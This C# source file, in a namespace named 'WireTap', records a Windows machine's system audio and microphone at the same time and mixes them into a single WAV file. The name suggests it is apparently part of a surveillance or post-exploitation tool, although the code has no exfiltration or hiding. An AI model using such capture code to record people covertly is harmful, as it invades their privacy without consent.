using System;
using NAudio.Wave;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Wave.SampleProviders;

namespace WireTap
{
    class Audio
    {
        //private static WaveIn waveSource = null;
        //private static WaveFileWriter waveFile = null;

        public static void RecordSystemAudio(string outFile, int msToRecord = 10000)
        {
            // Redefine the capturer instance with a new instance of the LoopbackCapture class
            WasapiLoopbackCapture CaptureInstance = new WasapiLoopbackCapture();

            // Redefine the audio writer instance with the given configuration
            WaveFileWriter RecordedAudioWriter = new WaveFileWriter(outFile, CaptureInstance.WaveFormat);

            // When the capturer receives audio, start writing the buffer into the mentioned file
            CaptureInstance.DataAvailable += (s, a) =>
            {
                // Write buffer into the file of the writer instance
                RecordedAudioWriter.Write(a.Buffer, 0, a.BytesRecorded);
            };

            // When the Capturer Stops, dispose instances of the capturer and writer
            CaptureInstance.RecordingStopped += (s, a) =>
            {
                RecordedAudioWriter.Dispose();
                RecordedAudioWriter = null;
                CaptureInstance.Dispose();
            };
            
            // Start audio recording !
            CaptureInstance.StartRecording();
            Thread.Sleep(msToRecord);
            CaptureInstance.StopRecording();
        }

        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        public static void RecordMicrophone(string outFile, int msToRecord = 10000)
        {
            string guid = Guid.NewGuid().ToString();
            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/3f771824-56b8-4ebf-b941-7afe40a52895/record-audio?forum=vbgeneral
            StringBuilder buf = new StringBuilder();
            mciSendString("open new Type waveaudio Alias " + guid, buf, 0, IntPtr.Zero);
            mciSendString("set " + guid + " time format ms bitspersample 16 channels 2 samplespersec 44100 bytespersec 192000 alignment 4", null, 0, IntPtr.Zero);
            mciSendString("record " + guid, buf, 0, IntPtr.Zero);
            Thread.Sleep(msToRecord);
            mciSendString("stop " + guid, buf, 0, IntPtr.Zero);
            mciSendString("save " + guid + " " + outFile, buf, 0, IntPtr.Zero);
            mciSendString("close " + guid, buf, 0, IntPtr.Zero);
        }

        public static void RecordAudio(string outFile, int msToRecord)
        {
            string sysAudioFile = Helpers.CreateTempFileName(".wav");
            string micAudioFile = Helpers.CreateTempFileName(".wav");
            Thread sysThread = new Thread(() => Audio.RecordSystemAudio(sysAudioFile, msToRecord));
            Thread micThread = new Thread(() => Audio.RecordMicrophone(micAudioFile, msToRecord));
            sysThread.Start();
            micThread.Start();
            micThread.Join();
            
            using (var reader1 = new AudioFileReader(sysAudioFile))
            {
                using (var reader2 = new AudioFileReader(micAudioFile))
                {
                    reader1.Volume = 0.5f;
                    //reader2.Volume = 0.1f;
                    var mixer = new MixingSampleProvider(new[] { reader1, reader2 });
                    WaveFileWriter.CreateWaveFile16(outFile, mixer);
                }
            }

            File.Delete(sysAudioFile);
            File.Delete(micAudioFile);
        }
    }
}
